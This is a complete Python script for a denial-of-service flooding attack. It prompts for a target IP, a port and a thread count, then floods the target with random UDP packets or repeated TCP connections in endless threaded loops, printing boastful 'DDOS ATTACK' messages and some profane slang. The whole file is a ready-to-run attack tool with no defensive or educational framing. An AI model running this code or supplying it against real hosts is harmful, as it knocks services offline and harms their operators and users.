###!/usr/bin/env python3

import random
import socket
import threading

print('''
\033[35m  

▀▀█▀▀ ▒█▀▀▀ ░█▀▀█ ▒█▀▄▀█ 　 
░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▒█▒█ 　 
░▒█░░ ▒█▄▄▄ ▒█░▒█ ▒█░░▒█ 　 

           
                        
''')
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(Y/N):"))
times = int(input(" PACKETS PER ONE CONNECTION:"))
threads = int(input(" THREADS:"))
def run():
    data = random._urandom(1024)
    i = random.choice(("[]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" DOWN IP  FTWI!!!")
        except:
            print("[!] BRA NIK OMK!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" DOWN IP V2 FTWI!!!")
        except:
            s.close()
            print("[] BRA NIK OMK")

def run3():
    data = random._urandom(594)
    i = random.choice(("[]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"TEAM V2 DDOS ATTACK!!!")
        except:
            s.close()
            print("[*] BRA NIK OMK")

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()